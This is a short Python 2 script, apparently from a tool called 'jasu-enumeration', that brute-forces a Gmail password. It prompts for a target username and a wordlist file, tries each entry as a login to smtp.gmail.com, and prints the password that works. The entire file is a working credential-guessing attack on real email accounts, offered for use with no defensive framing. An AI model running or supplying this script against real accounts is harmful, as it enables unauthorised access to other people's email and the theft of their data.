#!/bin/python2
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("\033[4mjasu-enumeration\033[0m set(\033[91musername/gmail\033[0m) > ")
passswfile= raw_input("\033[4mjasu-enumeration\033[0m set(\033[91mpasswd/directory\033[0m) > ")

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print "\033[92m Password found: \033[0m %s" % (password)
        break

    except smtplib.SMTPAuthenticationError:
        print "Trying Password : failed \033[91m%s\033[0m " % (password)
